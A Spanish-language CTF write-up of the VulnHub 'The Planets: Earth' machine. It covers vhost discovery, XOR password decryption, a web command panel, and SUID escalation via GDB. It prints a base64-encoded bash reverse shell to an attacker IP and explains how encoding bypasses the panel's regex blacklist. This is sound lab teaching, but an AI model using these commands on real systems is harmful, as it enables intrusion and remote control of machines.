---
layout: post
title: "The Planets - Earth - Vulnhub"
date: 2026-07-15
img: assets/img/vulnhub/earth/banner.png
tags: [VulnHub, Linux, Enumeration, GDB, SUID ]
---


- IP víctima = 192.168.192.162
  
- IP atacante =192.168.192.139

# Vulnhub - The Planets: Earth

[Descarga Ova](https://www.vulnhub.com/entry/the-planets-earth,755/)

Comenzamos con la fase de reconocimiento,  descubrimos los siguientes puertos:
- 22 SSH
- 80  HTTP
- 443 HTTPS

 Al buscar sus versiones nos encontramos con esta info:

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715141535.png)


![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715141559.png)

**Importante**: La pista está en el certificado **SSL**, el fragmento del puerto 443 dice:
```
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
```

y **Nikto** nos confirma que estamos accediendo por la IP, pero el certificado espera un nombre de dominio.

`Hostname '192.168.192.163' does not match certificate names (CN: earth, SAN: earth)`

**Que quiere decir?**

El servidor utiliza **vhosts**. si intentamos ingresa directamente por el navegador usando la IP el servidor, apache no sabe qué página mostrarnos y devuelve el error `403 Forbidden`. Para ver el contenido, debemos forzar a que nuestra máquina resuelva estos dominios.

Agregamos los dominios al archivo `/etc/hosts` 

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715142520.png)

Ahora desde el navegador ingresamos con esos nombres de dominios y podremos ver el contenido.
`http://earth.local`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715182518.png)

`terratest.earth.local`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715182544.png)

Luego de inspeccionar las páginas no encontramos mayor información. Así que proseguiremos con un escaneo de directorios web.

**Nota**: Al intentar hacer el escaneo de forma normal, este nos arrojaba un error debido al certificado SSL, para poder lanzarlo debemos agregar el argumento `-k` .
![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715143655.png)

El resultado fue un archivo conocido: `robots.txt`. Debemos recordar que **Disallow** es una instrucción que le indica a los robots de los motores de búsqueda que no rastreen ni visiten las rutas que están escritas.

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715143822.png)

Al final de este nos encontramos con una nueva ruta a un archivo. `testingnotes.*` (asumimos que el * se reemplaza por un .txt).

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715143808.png)

Este archivo tiene algunos datos de interés:
- Se usó el algoritmo **XOR** para encriptar.
- `testdata.txt` se utilizó como llave para encriptar.
- **terra** se usó como usuario para el portal de administración.

Leemos el archivo `testdata.txt`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715144822.png)


En la página de `earth.local`,  tenemos un cuadro donde podemos ingresar texto. Por los descubrimientos anteriores sabemos que se encriptó el texto en XOR, y que el archivo `testdata.txt` se utilizó como llave.

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715183621.png)

Teniendo esto en mente utilizamos **CyberChef** para descifrar el mensaje.

- En la entrada introducimos la cadena hexadecimal del mensaje cifrado.
- Recipe: 
	- `From Hex`: Operación necesaria para agrupar los caracteres de texto de dos en dos y convertir sus bytes binarios reales correspondientes.
	- `XOR`: Configurado con el equipo de codificación **UTF-8** y utilizando el contenido del archivo `testdata.txt` como llave.


![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715164721.png)

El resultado fue el  mensaje: `earthclimatechangebad4humans`.

Continuamos con los resultados del escaneo de directorios de `earth.local`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715164905.png)

El resultado fue una ruta hacia `/admin`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715165112.png)

Una vez ingresados, vemos un cuadro donde podemos lanzar comandos del sistema.
![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715165255.png)

El primer paso será saber que herramienta tenemos disponible

`which nc bash python python3 perl`

Obtenemos las herramientas disponibles en el sistema. Seguimos con la obtención  de acceso mediante una reverse shell.

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715171257.png)
Las conexiones remotas están prohibidas, esto ocurre cuando un servicio esta configurado con una regla que solo acepta peticiones del mismo (localhost) 

Se suele evadir estas reglas ofuscado los comandos mediante codificación **base64**.

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715171626.png)

`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xMzkvNDQ0NCAwPiYxCg==" | base64 -d | bash`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715171654.png)

El panel de comandos web implementaba un filtro de tipo **Lista Negra**, Este filtro analizaba el texto ingresado por el usuario utilizando expresiones regulares (Regex) antes de pasarlo a la terminal del sistema operativo.

El filtro bloqueaba de manera estricta cualquier cadena que tuviera direcciones IP en formato estándar (patrones como 192.168.x.x o cualquier número separado por puntos) y sintaxis típica de redirección IP (como descriptores de archivo `/dev/tcp/`)

Si el sistema detectaba uno de estos patrones, denegaba la ejecución mostrando el mensaje `"Remote connections are forbidden"`.

Para que el sistema víctima ejecute el comando real, no basta con enviarle la cadena en Base64, tenemos que decirle al sistema operativo que la decodifique y la procese sobre la marcha en la memoria.

Para ello, estructuramos el payload enviado al cuadro de comandos de la manera vista

``echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xMzkvNDQ0NCAwPiYxCg==" | base64 -d | bash``

Como la decodificación y ejecución ocurre después de que el filtro de la aplicación web ha validado la entrada, la seguridad del portal se vuelve completamente ineficaz, permitiéndonos recibir la reverse shell en nuestro equipo.

## Búsqueda de vector de escalada. 

Luego de una búsqueda de archivos con el SUID, dimos con uno que no corresponde al sistema.

`reset_root`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715173950.png)

Al tratar de ejecutarlo nos muestra un error

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715174046.png)

El error nos indica que faltan "Triggers" para poder ejecutarlo.

Intentamos analizar su contenido utilizando `strings`, pero las rutas de los triggers no aparecían de forma explícita en el texto plano del archivo. Esto indica que el binario construye o carga estas rutas de forma dinámica en la memoria durante su ejecución para dificultar en análisis rápido.

Para resolver este obstáculo. se optó por realizar un análisis dinámico offline. Se transfirío el binario mediante Base64 a nuestra máquina atacante para poder deputarlo de manera segura utilizando `GDB` (GNU Debugger) sin las restricciones de seguridad impuestas por el sistema Feroda de la víctima.

### Metodología

El objetivo de la depuración es congelar la ejecución del programa justo en el momento en que realizar la llamada al sistema para comprobar la existencia de los archivos. El sistema operativo Linux utiliza la función de biblioteca `access()` para este propósito.

Aprovechando la arquitectura **x86_64**, sabemos por convención de llamadas de Linux que **el primer argumento de una función se almacena en el registro** `RDI` **de la CPU**. En el caso de la función `access(const char *pathname, int mode`, el registro `RDI` apuntará directamente a la dirección de memoria que contiene la ruta del archivo que se está comprobando.

**Paso A: Carga del binario y establecimiento del Punto de Interrupción**

Se inició `GDB` apuntando al binario y se colocó un _breakpoint_ en la función `access`

```
┌──(yorve㉿SecNotes)-[~]
└─$ gdb ./reset_root
(gdb) break access
Breakpoint 1 at 0x7ffff7ea4a30
```

**Paso B: Ejecución e Interceptación en Memoria**

Al iniciar el programa con el comando `run`, la ejecución se detuvo inmediatamente al alcanzar el breakpoint en la función `access`, justo antes de que el programa pudiera fallar por la ausencia de los archivos.

```
(gdb) run
Starting program: /home/yorve/reset_root 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
CHECKING IF RESET TRIGGERS PRESENT...

Breakpoint 1, 0x00007ffff7ea4a30 in access () from /usr/lib/x86_64-linux-gnu/libc.so.6
```

**Paso C: Repetición del Proceso (Segundo y Tercer Trigger)**

para avanzar al siguiente punto de comprobación, se introdujo el comando `continue` (`c`) y se volvió a examinar el registro `RDI` repetidamente:

Segundo Ciclo

```
(gdb) c
... (detenido en Breakpoint 1)
(gdb) x/s $rdi
"/dev/shm/Zw7bV9U5"
```

Tercer Ciclo

```
(gdb) c
... (detenido en Breakpoint 1)
(gdb) x/s $rdi
"/tmp/kcM0Wewe"
```

### Conclusión del análisis de Ingeniería Inversa

A través de la interceptación del registro `RDI` en los puntos de parada de la función `access`, se eludió la ofuscación en la memoria del binario. Esto permitió obtener la lista completa y exacta de los tres archivos necesarios para completar las condiciones del binario SUID:

1. `/dev/shm/kHgTFI5G`
2. `/dev/shm/Zw7bV9U5`
3. `/tmp/kcM0Wewe`

La posterior creación de estos archivos vacíos mediante `touch` en la máquina víctima habilitó el correcto funcionamiento del binario para la consecución del privilegio `root`.

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715181116.png)

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715181128.png)

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715181251.png)

Ahora al ejecutar el binario, este se ejecuta sin problemas y nos cambia la contraseña a `Earth`

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715181405.png)

Con este nuevo dato cambiamos al usuario `root` y así obtenemos el control total de la máquina. 

![](/secnotes/assets/img/vulnhub/earth/Pasted image 20260715181720.png)
